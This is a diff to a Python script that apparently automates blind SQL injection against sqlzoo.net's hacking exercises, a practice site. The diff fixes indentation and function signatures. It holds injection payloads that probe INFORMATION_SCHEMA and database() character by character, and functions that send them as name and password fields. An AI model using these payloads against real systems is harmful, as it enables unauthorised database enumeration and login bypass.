@@ -339,6 +339,7 @@ def payloadDictionary(payload, lst):
    dikt = {}
    for i in lst:
       dikt[i] = payload
+   return dikt
 
 def NamePasswordDictionary(payload, username, password):
    """ wrapper for payloadDictionary   """
@@ -362,7 +363,7 @@ def isVulnerable(url):
    return readQuery(txt)
 
 def characterInTableName():
-"""
+   """
    https://sqlzoo.net/hack/24table.htm
 Is there a table called one in database test?
     "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME='one') AND ''='"
@@ -373,24 +374,24 @@ Is there a table called one in database test?
    pass
 
 
-nTablesMatch():
-""" how many tables match
-
-Is there more than one table in the database(s) containing a j?
-    "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%j%')>1 AND ''='"
-
-"""   
+def nTablesMatch():
+   """ how many tables match
+   
+   Is there more than one table in the database(s) containing a j?
+       "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%j%')>1 AND ''='"
+   
+   """   
    pass
 
 
 def characterInDatabaseName(ch, url, index = "no index"):
-"""
-   a c
-Does the current database contain the letter j?
-   "' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%j%') AND ''='"
-
-"""
-   payload = constructDatabaseQuery(ch, url, index)
+   """
+      
+   Does the current database contain the letter j?
+      "' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%j%') AND ''='"
+   
+   """
+   payload = constructDatabaseQuery(ch, index)
    payload = NamePasswordDictionary(payload, "name", "password")
    txt = sendQuery(payload, url)
    return readQuery(txt)
@@ -398,8 +399,8 @@ Does the current database contain the letter j?
 
 
 
-def constructDatabaseQuery(ch, url, index = "no index"):
-"""helper function for characterInDatabaseName"""
+def constructDatabaseQuery(ch, index = "no index"):
+   """helper function for characterInDatabaseName"""
    payload = "' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '" 
 
    nameStr = ""
